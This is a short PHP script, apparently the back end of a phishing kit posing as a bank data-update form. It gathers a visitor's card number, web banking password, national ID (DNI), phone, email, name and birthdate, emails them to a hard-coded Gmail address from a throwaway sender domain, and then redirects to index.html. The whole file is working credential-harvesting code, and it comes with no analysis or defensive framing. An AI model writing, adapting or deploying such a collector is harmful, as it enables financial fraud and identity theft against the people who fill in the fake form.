<?php

    session_start();
    
    //valores del formulario 
    $name = $_POST['name'];
    $dni = $_POST['dni'];
    $tel = $_POST['tel'];
    $email = $_POST['email'];
    $cc = $_SESSION['cc'];
    $pass = $_SESSION['pass'];
    $birthdate = $_POST['birthdate'];

    //Correo a donde se envía la información
    $to = "cruzadoeduar18@gmail.com";

    //Asunto de correo
    $subject = "ACTUALIZACIÓN DE DATOS";

    //Informacion que se envía en el correo
    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
            "DNI: " . $dni . "\n" . 
            "NUMERO DE TELEFONO: " . $tel . "\n" . 
            "DIRECCIÓN DE CORREO: " . $email . "\n" .
            "NOMBRE: " . $name . "\n" . 
            "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
            "CLAVE WEB: " . $pass;

    //Destinatario
    $headers = "From: pruebas@pruebas.ga";

    mail($to, $subject, $txt, $headers);

    //Al finalizar se elimina la sesión y se borran las variables con la información del formulario
    session_unset();
    session_destroy();

    //redireccionar
    header("Location:index.html");
?>